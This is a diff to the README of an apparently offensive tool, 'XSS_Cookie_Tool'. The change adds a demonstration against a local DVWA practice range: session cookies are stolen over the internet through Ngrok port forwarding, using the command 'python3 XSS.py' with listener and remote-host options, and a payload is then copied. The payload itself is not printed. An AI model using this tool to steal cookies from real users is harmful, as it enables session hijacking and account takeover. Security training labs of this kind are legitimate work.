@@ -16,12 +16,16 @@
 
       ```#python3 XSS.py -t -lp (Local port) -rh (Remote host IP) -rp (Remote host port)```
 
-## Effect demonstration
+## Effect demonstration 
+ * Here, XSS will be demonstrated in the local DVWA shooting range, and cookies will be stolen through the internet
+
+_If your machine has a public IP address, just listen to the local port_
+
 * Enable port forwarding (Ngrok is used for demonstration)
 ![图片名称](https://raw.githubusercontent.com/MartinxMax/XSS_Cookie_Tool/master/%C2%96%C2%96Demo_image/TCP.png "Port forwarding")  
 * Use Internet attack
 
     ```#python3 XSS.py -t -lp 8080 -rh ***.***.***.*** -rp 10029```
- 
+ ![图片名称](https://raw.githubusercontent.com/MartinxMax/XSS_Cookie_Tool/master/%C2%96%C2%96Demo_image/PAYLOAD.png "PAYLOAD")  
 Copy PAYLOAD
-* 
+
